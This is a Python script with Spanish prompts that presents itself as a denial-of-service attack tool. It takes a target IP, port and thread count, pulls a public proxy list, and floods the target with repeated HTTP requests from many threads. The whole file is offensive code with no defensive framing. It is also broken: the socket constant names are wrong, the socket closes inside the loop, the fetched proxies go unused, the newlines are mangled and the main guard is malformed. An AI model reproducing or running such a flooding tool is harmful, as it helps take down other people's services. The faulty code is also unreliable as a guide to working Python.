import socket
import threading
import os
import random
from rich import print
from rich.console import Console
import requests
import time

console = Console()

def ddosattack(ip, port, proxies, useragent):
    sock = socket.socket(socket.AFINET, socket.SOCKSTREAM)
    sock.connect((ip, port))
    sock.setsockopt(socket.SOLSOCKET, socket.SOREUSEADDR, 1)
    while True:
        request = f"GET / HTTP/1.1\r
Host: {ip}\r
User-Agent: {useragent}\r
\r
"
        sock.send(request.encode())
        response = sock.recv(1024)
        if response:
            console.print(f"[bold green]Paquete enviado a {ip}[/bold green]")
            console.print(f"[bold blue]Request: {request}[/bold blue]")
            console.print(f"[bold red]Response: {response}[/bold red]")
        else:
            console.print(f"[bold red]Error al enviar paquete a {ip}[/bold red]")
        time.sleep(1)
        sock.close()

def randomuseragent():
    useragents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
    ]
    return random.choice(useragents)

def getproxies():
    proxies = []
    response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
    for proxy in response.text.splitlines():
        proxies.append(proxy)
    return proxies

def main():
    ip = input("Ingrese la IP del servidor objetivo: ")
    port = int(input("Ingrese el puerto del servidor objetivo: "))
    proxies = getproxies()
    useragent = randomuseragent()
    numthreads = int(input("Ingrese el n√∫mero de hilos: "))
    threads = []
    for i in range(numthreads):
        proxy = random.choice(proxies)
        thread = threading.Thread(target=ddosattack, args=(ip, port, proxy, useragent))
        threads.append(thread)
        thread.start()

    console.print(f"[bold green]Ataque iniciado contra {ip}[/bold green]")
    for thread in threads:
        thread.join()

    console.print(f"[bold green]Ataque finalizado[/bold green]")

if name == "main_":
    main()